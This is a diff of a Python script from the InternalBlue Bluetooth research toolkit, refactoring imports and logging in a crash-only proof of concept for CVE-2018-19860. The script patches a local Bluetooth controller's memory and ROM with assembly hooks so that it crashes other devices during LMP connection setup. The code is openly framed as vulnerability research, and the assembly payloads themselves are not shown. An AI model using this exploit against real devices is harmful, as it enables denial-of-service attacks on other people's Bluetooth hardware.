@@ -1,12 +1,10 @@
 #!/usr/bin/python3
 
 # Jiska Classen, Secure Mobile Networking Lab
+from pwnlib.asm import asm
 
-import sys
-
-from pwn import *
 from internalblue.adbcore import ADBCore
-
+from internalblue.utils import p32
 
 """
 This is a crash only test for CVE-2018-19860. Install this patch and connect
@@ -116,45 +114,45 @@ internalblue.interface = internalblue.device_list()[0][1]  # just use the first 
 
 # setup sockets
 if not internalblue.connect():
-    log.critical("No connection to target device.")
+    internalblue.logger.critical("No connection to target device.")
     exit(-1)
 
-progress_log = log.info("installing assembly patches to crash other device on connect requests...")
+progress_log = internalblue.logger.info("installing assembly patches to crash other device on connect requests...")
 
-#progress_log = log.info("Writing ASM snippet for LMP 00 table lookup.")
+#progress_log = internalblue.logger.info("Writing ASM snippet for LMP 00 table lookup.")
 code = asm(ASM_SNIPPET_LMP_00_LOOKUP, vma=ASM_LOCATION_LMP_00_LOOKUP)
 if not internalblue.writeMem(address=ASM_LOCATION_LMP_00_LOOKUP, data=code, progress_log=progress_log):
-    progress_log.critical("error!")
+    internalblue.logger.critical("error!")
     exit(-1)
     
-#progress_log = log.info("Installing predefined hook for LMP table lookup.")
+#progress_log = internalblue.logger.info("Installing predefined hook for LMP table lookup.")
 if not internalblue.writeMem(address=HOOK_LMP_00_LOOKUP, data=p32(ASM_LOCATION_LMP_00_LOOKUP + 1), progress_log=progress_log):
-    progress_log.critical("error!")
+    internalblue.logger.critical("error!")
     exit(-1)
 
 
 
 
-#progress_log = log.info("Writing ASM snippet for LMP VSC existence check.")
+#progress_log = internalblue.logger.info("Writing ASM snippet for LMP VSC existence check.")
 code = asm(ASM_SNIPPET_VSC_EXISTS, vma=ASM_LOCATION_VSC_EXISTS)
 if not internalblue.writeMem(address=ASM_LOCATION_VSC_EXISTS, data=code, progress_log=progress_log):
-    progress_log.critical("error!")
+    internalblue.logger.critical("error!")
     exit(-1)
     
 
 # all send_lmp functions are in rom...
-#log.info("Installing LMP VSC existence hook patch...")
+#internalblue.logger.info("Installing LMP VSC existence hook patch...")
 patch = asm("b 0x%x" % ASM_LOCATION_VSC_EXISTS, vma=HOOK_VSC_EXISTS)
 if not internalblue.patchRom(HOOK_VSC_EXISTS, patch):
-    log.critical("Installing patch for VSC existence check failed!")
+    internalblue.logger.critical("Installing patch for VSC existence check failed!")
     exit(-1)
 
 
-log.info("Installed all the hooks. You can now establish connections to other devices to check for the LMP CVE.")
+internalblue.logger.info("Installed all the hooks. You can now establish connections to other devices to check for the LMP CVE.")
 
 # shutdown connection
 internalblue.shutdown()
-log.info("------------------")
-log.info("To test the vulnerability, establish a classic Bluetooth connection to the target device. Eventually try different values for LMP_VSC_CMD_*.")
+internalblue.logger.info("------------------")
+internalblue.logger.info("To test the vulnerability, establish a classic Bluetooth connection to the target device. Eventually try different values for LMP_VSC_CMD_*.")
 
 
